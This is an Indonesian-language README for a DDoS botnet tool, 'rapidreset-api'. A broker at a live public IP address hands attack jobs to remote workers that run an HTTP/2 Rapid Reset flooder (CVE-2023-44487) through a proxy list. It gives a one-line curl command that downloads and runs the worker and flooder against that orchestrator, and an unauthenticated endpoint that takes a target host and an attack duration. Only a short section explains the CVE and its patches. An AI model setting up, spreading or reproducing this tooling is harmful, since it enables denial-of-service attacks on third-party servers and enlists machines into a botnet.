<div align="center">

# rapidreset-api

**Orchestrator + remote workers untuk HTTP/2 Rapid Reset.**

![node](https://img.shields.io/badge/node.js-v24-339933?logo=node.js&logoColor=white)
![javascript](https://img.shields.io/badge/javascript-ES2023-F7DF1E?logo=javascript&logoColor=black)
![http2](https://img.shields.io/badge/HTTP%2F2-RFC%209113-005A9C)
![license](https://img.shields.io/badge/license-mit-8B5CF6)
![status](https://img.shields.io/website?up_message=online&down_message=offline&url=http%3A%2F%2F204.10.194.164%3A3295)

`CVE-2023-44487` · `CWE-400` · CVSS `7.5` HIGH

[Server aktif](#server-aktif) · [Setup client](#setup-client) · [Endpoint](#endpoint) · [CVE](#cve-2023-44487) · [Catatan](#catatan)

</div>

---

Satu proses kecil (`index.js`) membuka endpoint publik. Worker (`bot/client.js`) konek dari mesin mana pun, mengambil job, lalu menjalankan `rapidreset.js` secara lokal. Broker tidak pernah menjalankan proses sendiri — dia hanya memegang antrean dan memilih worker idle.

```
client.js  ──HTTP upgrade──▶  index.js  ──job──▶  client.js  ──spawn──▶  rapidreset.js
   worker                       broker                worker                flooder
```

## Isi repo

| Path | Fungsi |
| --- | --- |
| `index.js` | broker + HTTP API + halaman dokumentasi di `/` |
| `method.json` | daftar method dan template command `<<host>>` `<<time>>` `<<method>>` |
| `bot/client.js` | worker, konek ke `index.js` lalu eksekusi command |
| `bot/rapidreset.js` | flooder HTTP/2, CVE-2023-44487 |
| `bot/proxi.txt` | daftar proxy, satu per baris |

## Server aktif

```
http://204.10.194.164:3295
```

| Halaman | URL |
| --- | --- |
| Dokumentasi interaktif | http://204.10.194.164:3295/ |
| Kirim job | http://204.10.194.164:3295/api/attack?host=&time=&method= |
| Status worker | http://204.10.194.164:3295/api/workers |

## Setup server

```bash
git clone https://github.com/malasahjagotwin/rapidreset-api.git
cd rapidreset-api
npm install                # hanya butuh hpack
node index.js
```

Variabel lingkungan:

| Nama | Default | Keterangan |
| --- | --- | --- |
| `PORT` | `SERVER_PORT` lalu `3295` | port bind |
| `HOST` | `0.0.0.0` | interface bind |
| `CLIENT_TOKEN` | kosong | kalau diisi, worker wajib kirim header yang sama |

## Setup client

Satu baris. Download tiga file, install `hpack`, lalu start.

```bash
mkdir -p bot && cd bot \
  && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/client.js \
  && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/rapidreset.js \
  && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/proxi.txt \
  && npm i hpack --no-audit --no-fund \
  && ORCHESTRATOR=http://204.10.194.164:3295 node client.js
```

Dengan token:

```bash
CLIENT_TOKEN=rahasia ORCHESTRATOR=http://204.10.194.164:3295 node client.js
```

Worker tambahan cukup ulangi perintah yang sama. Beberapa job paralel per mesin:

```bash
MAX_CONCURRENT=2 ORCHESTRATOR=http://204.10.194.164:3295 node client.js
```

## Endpoint

```
GET /api/attack?host=<url>&time=<detik>&method=<nama>
```

| Parameter | Wajib | Keterangan |
| --- | --- | --- |
| `host` | ya | URL target, `http://` atau `https://`, tanpa spasi |
| `time` | ya | durasi detik, `1`–`300` (alias lama: `itme`) |
| `method` | ya | nama dari `method.json` |

```bash
curl "http://204.10.194.164:3295/api/attack?host=https://example.com&time=30&method=rapidreset"
```

```json
{
  "ok": true,
  "id": "4b7d1c2e-...",
  "status": "queued",
  "method": "rapidreset",
  "host": "https://example.com",
  "time": 30,
  "statusUrl": "/api/attack/4b7d1c2e-..."
}
```

Respons `202`, eksekusi di worker. Pantau lewat `statusUrl` selama `queued` atau `running`.

### Daftar endpoint

| Endpoint | Metode | Fungsi |
| --- | --- | --- |
| `/` | GET | halaman dokumentasi |
| `/api/attack` | GET | kirim job |
| `/api/attack/<id>` | GET | status job |
| `/api/workers` | GET | daftar worker dan panjang antrean |
| `/api/worker` | GET + Upgrade | kanal worker utama |
| `/api/worker/signal` | POST | kanal cadangan kalau `Upgrade` diblokir proxy |

## Menambah method

Edit `method.json`:

```json
[
  {
    "name": "rapidreset",
    "command": "node rapidreset.js GET <<host>> <<time>> 1 64 proxi.txt",
    "description": "CVE-2023-44487"
  }
]
```

Placeholder yang dikenali hanya `<<host>>`, `<<time>>`, dan `<<method>>`. Placeholder lain membuat request ditolak.

## CVE-2023-44487

HTTP/2 Rapid Reset. Publikasi 10 Oktober 2023, CVSS 7.5 HIGH, CWE-400 uncontrolled resource consumption. Memicu Google mencatat 398 juta rps dan Cloudflare 201 juta rps — DDoS terbesar yang pernah tercatat saat itu.

Protokol HTTP/2 mengizinkan banyak stream dalam satu koneksi TCP/TLS. Setiap stream baru memaksa server mengalokasikan konteks: state parser HPACK, stream state machine, buffer, dan slot di `SETTINGS_MAX_CONCURRENT_STREAMS`.

Serangan memanfaatkan celah urutan itu. Klien membuka stream dengan `HEADERS` lalu segera mengirim `RST_STREAM`, membatalkan stream sebelum server selesai menyiapkan konteksnya. Pembatalan diproses lebih cepat daripada alokasi, sehingga batas stream konkuren tidak pernah tercapai. Server tetap membayar biaya kerja, lalu membuangnya. Loop itu diulang selama koneksi masih hidup, jadi satu koneksi bisa memicu puluhan ribu stream per detik.

Patch-nya bukan pada parser, tapi pada kebijakan stream: batasi `SETTINGS_MAX_CONCURRENT_STREAMS` secara agresif, jangan langsung buang state stream saat `RST_STREAM` datang, dan tambahkan kuota stream per koneksi. Go `net/http`, nginx, Apache httpd, Envoy, HAProxy, dan Node.js semuanya rilis perbaikan pada Oktober 2023.

| Field | Nilai |
| --- | --- |
| CVE | `CVE-2023-44487` |
| Nama | HTTP/2 Rapid Reset |
| CWE | `CWE-400` |
| CVSS | `7.5` HIGH — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Publikasi | 2023-10-10 |
| Dampak | Denial of service |
| Mitigasi | batas stream per koneksi, penanganan `RST_STREAM` |

## Catatan

- `/api/attack` tidak memakai autentikasi apa pun. Siapa pun yang bisa membuka URL-nya bisa mengirim job dan menjalankannya dari worker yang terhubung.
- Worker yang putus di tengah job membuat job gagal setelah timeout 60 detik.
- Antrean dibatasi 32 job menunggu, sisanya ditolak `503`.